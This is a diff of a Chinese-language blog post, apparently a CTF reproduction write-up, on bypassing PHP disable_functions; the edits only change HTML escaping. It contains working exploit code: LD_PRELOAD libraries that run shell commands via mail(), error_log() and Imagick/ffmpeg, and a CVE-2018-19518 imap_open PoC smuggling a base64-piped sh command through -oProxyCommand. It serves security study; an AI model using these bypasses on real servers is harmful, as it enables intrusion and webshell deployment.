@@ -416,9 +416,9 @@ Bypass思路利用LD_PRELOAD什么是LD_PRE">
 <pre><code>LD_PRELOAD是Linux系统的一个环境变量，用于动态库的加载，动态库加载的优先级最高，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。
 </code></pre><p>简单来说就是<code>LD_PRELOAD</code>指定的动态链接库文件，会在其它文件调用之前先被调用</p>
 <h3 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h3><p>光看概念估计你可能会很懵，我们来写一个简单的demo来了解一下啥是<code>LD_PRELOAD</code><br>首先我们先写一个id.c，内容如下：</p>
-<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;dlfcn.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;dlfcn.h&gt;</span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h&gt;</span></span>
 
 uid_t <span class="token function">geteuid</span><span class="token punctuation">(</span> <span class="token keyword">void</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
 uid_t <span class="token function">getuid</span><span class="token punctuation">(</span> <span class="token keyword">void</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
@@ -461,11 +461,11 @@ root
 <p>我们可以用strace查看一下mail函数调用的过程，可以很明显看出来执行了<code>sendmail -t -i</code><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330023106-d0f82628-5250-1.png" alt="image.png"></p>
 <p>然后我们可以使用 <code>readelf -Ws /usr/sbin/sendmail</code> 可以查看senmail都调用了哪一些函数，然后从中选几个即可，这里我们选择<code>getuid</code></p>
 <p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330013011-4deed608-5248-1.png" alt="image.png"><br>然后就可以编写我们的动态连接程序<br>test.c</p>
-<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>
 <span class="token keyword">void</span> <span class="token function">payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"ls > test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"ls &gt; test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>   
 <span class="token keyword">int</span>  <span class="token function">geteuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
@@ -481,7 +481,7 @@ gcc --share test -o test.so
 <pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD=./test.so"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">mail</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span>
+<span class="token delimiter">?&gt;</span>
 </code></pre>
 <p>执行一波，然后用strace查看调用过程是否执行了我们的<code>ls &gt; test</code>，可以发现成执行了我们的命令</p>
 <p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330030422-76438ea2-5255-1.png" alt="image.png"></p>
@@ -495,13 +495,13 @@ gcc --share test -o test.so
 <pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD=./test.so"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">error_log</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span>
+<span class="token delimiter">?&gt;</span>
 </code></pre>
 <p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330030223-2f5a5796-5255-1.png" alt="image.png"></p>
 <p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330030310-4b46e942-5255-1.png" alt="image.png"></p>
 <p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330090346-ab7e1f1a-5287-1.png" alt="image.png"></p>
 <h2 id="利用ImageMagick"><a href="#利用ImageMagick" class="headerlink" title="利用ImageMagick"></a>利用ImageMagick</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>这个搭建环境有一丝丝繁琐，不过没关系，按照我以下步骤来应该问题不大QAQ</p>
-<pre class=" language-sh"><code class="language-sh">1：apt-get update&&apt-get install imagemagick
+<pre class=" language-sh"><code class="language-sh">1：apt-get update&amp;&amp;apt-get install imagemagick
 2：convert -version //如果安装成功会返回imagemagick版本号
 </code></pre>
 <p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330121909-f6e6dfbc-52a2-1.png" alt="image.png"></p>
@@ -517,7 +517,7 @@ apt-get install libmagickwand-dev
 
 4.  ./configure --with-php-config=/usr/bin/php-config --with-imagick=/usr/local/imagemagick //注意php-config可能会不同，要根据你具体的情况来修改
 
-5.make&&make install
+5.make&amp;&amp;make install
 
 6.改一波php.ini，随便一行添加：extension = imagick.so
 
@@ -534,7 +534,7 @@ ffmpeg -v 看看是否安装成功
 </code></pre><p>我们来写一个小demo来验证一下是否正确<br>img.php</p>
 <pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 <span class="token variable">$img</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Imagick</span><span class="token punctuation">(</span><span class="token string">'img.mp4'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//img.mp4文件必须存在，否则就会不去调用ffmpeg</span>
-<span class="token delimiter">?></span>
+<span class="token delimiter">?&gt;</span>
 </code></pre>
 <p>我们strace一下看看执行的过程，可以发现在执行的过程中调用了ffmpeg</p>
 <p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330123601-52125e32-52a5-1.png" alt="image.png"></p>
@@ -545,13 +545,13 @@ __attribute__语法格式为：__attribute__ ( ( attribute-list ) )
 若函数被设定为constructor属性，则该函数会在main（）函数执行之前被自动的执行。类似的，若函数被设定为destructor属性，则该函数会在main（）函数执行之后或者exit（）被调用后被自动的执行。例如下面的程序：
 </code></pre><p>我们可以知道当该函数为<code>__attribute__((__constructor__))</code>的时候，会在main（）函数执行之前被自动的执行<br>所以我们尝试构造poc.c</p>
 <pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> _GNU_SOURCE</span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h&gt;</span></span>
 
 <span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>__constructor__<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">void</span> <span class="token function">angel</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
     <span class="token function">unsetenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"ls > test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"ls &gt; test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
 </code></pre>
 <p>然后生成我们的动态链接程序</p>
@@ -562,7 +562,7 @@ gcc --share poc -o poc.so
 <pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD=./poc.so"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token variable">$img</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Imagick</span><span class="token punctuation">(</span><span class="token string">'img.mp4'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span>
+<span class="token delimiter">?&gt;</span>
 </code></pre>
 <p>运行一波，发现我们的命令执行成功了<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330131614-f0c0b768-52aa-1.png" alt="image.png"></p>
 <h2 id="利用imap-open-CVE-2018-19518"><a href="#利用imap-open-CVE-2018-19518" class="headerlink" title="利用imap_open (CVE-2018-19518)"></a>利用imap_open (CVE-2018-19518)</h2><p>php imap扩展用于在PHP中执行邮件收发操作。其imap_open函数会调用rsh来连接远程shell，而debian/ubuntu中默认使用ssh来代替rsh的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）。<br>因为ssh命令中可以通过设置<code>-oProxyCommand=</code>来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞。</p>
@@ -581,11 +581,11 @@ test.txt
 <p><code>CVE-2018-19518</code>的环境可以直接使用vulhub上的环境：<a href="https://github.com/vulhub/vulhub/tree/master/php/CVE-2018-19518" title="链接" target="_blank" rel="noopener">链接</a></p>
 <p>直接上poc</p>
 <pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token string">"echo test!test! > /tmp/test"</span><span class="token punctuation">;</span>
+<span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token string">"echo test!test! &gt; /tmp/test"</span><span class="token punctuation">;</span>
 <span class="token variable">$base64_exp</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$exp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token variable">$server</span> <span class="token operator">=</span> <span class="token string">"x -oProxyCommand=echo\t${base64_exp}|base64\t-d|sh}"</span><span class="token punctuation">;</span>
 <span class="token function">imap_open</span><span class="token punctuation">(</span><span class="token string">'{'</span><span class="token punctuation">.</span><span class="token variable">$server</span><span class="token punctuation">.</span><span class="token string">':143/imap}INBOX'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"\n\nError: "</span><span class="token punctuation">.</span><span class="token function">imap_last_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span>
+<span class="token delimiter">?&gt;</span>
 </code></pre>
 <p>执行一波，可以发现执行成功了，要想写webshell的话直接把我们的exp改一下就ok了，这里就不多赘述了<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330100258-f0e06182-528f-1.png" alt="image.png"></p>
 <h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>被0ctf锤哭了，膜RR师傅Orz，比赛的时候没有做出来，赛后没有时间复现，等到想要复现的时候环境已经关了，只能是本地复现了，顺便总结了一下。</p>
